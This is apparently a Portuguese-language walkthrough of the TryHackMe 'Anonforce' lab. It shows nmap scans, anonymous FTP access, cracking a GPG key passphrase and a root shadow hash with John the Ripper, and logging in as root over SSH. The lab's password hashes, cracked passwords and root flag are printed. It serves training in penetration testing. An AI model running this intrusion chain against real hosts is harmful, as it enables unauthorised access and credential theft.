---
title: 'TryHackMe: Anonforce'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Nmap, Ftp, Gpg, John, Ssh ]
image:
  path: assets/images/tryhackme/anonforce/room.png
---

# ALVO

10.10.79.128

# NMAP

```

┌──(root㉿kali)-[/home/kali]
└─# nmap -F 10.10.79.128                                
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 06:50 EST
Nmap scan report for 10.10.79.128
Host is up (0.26s latency).
Not shown: 72 closed tcp ports (reset), 26 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.58 seconds
                                                                             
┌──(root㉿kali)-[/home/kali]
└─# nmap 10.10.79.128 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 06:53 EST
Nmap scan report for 10.10.79.128
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 7.75 seconds


```

# FTP

```

ftp 10.10.79.128
Connected to 10.10.79.128.
220 (vsFTPd 3.0.3)
Name (10.10.79.128:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||35674|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Feb 23 03:45 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   93 0        0               0 Feb 23 03:45 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Feb 23 03:45 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Feb 23 03:45 sys
drwxrwxrwt    9 0        0            4096 Feb 23 03:45 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||52738|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||34948|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |********************************|   524      777.68 KiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (1.72 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||51403|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |********************************|  3762        6.29 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (11.97 KiB/s)
ftp> 
ftp> exit
221 Goodbye.


```

Pegar também o arquivo user.txt dentro de home/melodias (ele possui a secret)

# GPG

(Para resetar tudo do gpg): 
cp -r ~/.gnupg ~/.gnupg_backup
rm -rf ~/.gnupg

```

gpg --import private.asc

gpg --decrypt backup.pgp

                       ┌───────────────────────────────────────────────────────────────┐
                       │ Please enter the passphrase to import the OpenPGP secret key: │
                       │ "anonforce <melodias@anonforce.nsa>"                          │
                       │ 2048-bit DSA key, ID B92CD1F280AD82C2,                        │
                       │ created 2019-08-12.                                           │
                       │                                                               │
                       │                                                               │
                       │ Passphrase: ********************************_________________ │
                       │                                                               │
                       │         <OK>                                   <Cancel>       │
                       └───────────────────────────────────────────────────────────────┘


A senha não é a secret do user.txt então vamos tentar descobrir usando John

```

# John

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ls
backup.pgp  kertonlipenguin.ovpn  private.asc  user.txt
                                                                                                               
┌──(root㉿kali)-[/home/kali/Downloads]
└─# gpg2john private.asc > hash                             

File private.asc
                                                                                                               
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ls
backup.pgp  hash  kertonlipenguin.ovpn  private.asc  user.txt
                                                                                                               
┌──(root㉿kali)-[/home/kali/Downloads]
└─# john hash                                                
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
xbox360          (anonforce)     
1g 0:00:00:02 DONE 2/3 (2025-02-23 07:33) 0.4926g/s 7824p/s 7824c/s 7824C/s xbox360..madalina
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Ok, agora podemos descriptografar o arquivo

```

gpg --import private.asc
gpg --decrypt backup.pgp


└─# gpg --decrypt backup.pgp
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::      

```

Ok agora tentar encontrar essa senha do root com força bruta novamente. Ajudando o john dizendo que é 512 bits e passando uma wordlist que é mais fácil de achar.

```
cat hash2.txt
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::

──(root㉿kali)-[/home/kali/Downloads]
└─# john hash2.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)     
1g 0:00:00:03 DONE (2025-02-23 07:51) 0.2666g/s 1843p/s 1843c/s 1843C/s 98765432..better
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

# SSH

```
ssh root@10.10.79.128       
root@10.10.79.128's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# ls
root.txt
root@ubuntu:~# cat root.txt
f706456440c7af4187810c31c6cebdce

```

![alt text](assets/images/tryhackme/anonforce/complete.png)